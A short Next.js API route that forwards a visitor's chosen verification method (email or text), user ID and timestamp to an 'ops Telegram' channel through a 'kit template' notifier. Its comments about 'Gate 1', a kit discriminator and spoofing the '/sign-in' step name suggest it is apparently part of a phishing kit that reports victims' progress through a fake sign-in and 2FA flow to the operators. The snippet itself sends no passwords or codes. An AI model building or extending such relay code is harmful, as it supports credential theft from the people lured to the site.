import { NextRequest, NextResponse } from "next/server"

import { getClientIpFromRequest } from "@/lib/client-ip"
import { sendFormNotification } from "@/lib/telegram"

/**
 * Gate 1 method selection event → ops Telegram.
 * Kit template: `sendFormNotification` type "email_verification" / "text_verification".
 */
export async function POST(request: NextRequest) {
  try {
    const data = (await request.json().catch(() => ({}))) as Record<
      string,
      unknown
    >;
    const method = data.method === "email" ? "email" : "text";

    await sendFormNotification({
      type: method === "email" ? "email_verification" : "text_verification",
      // Kit discriminator: the method-selection branch matches pages starting
      // with /login/2fa-verify or /sign-in (or containing /verify). This site
      // routes Gate 1 at /verification/method, so the kit's own /sign-in step
      // name is sent rather than patching the kit template.
      page: "/sign-in",
      userId: String(data.userId ?? ""),
      method,
      timestamp: new Date().toISOString(),
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Verification click notify failed:", error);
    return NextResponse.json({ success: true });
  }
}
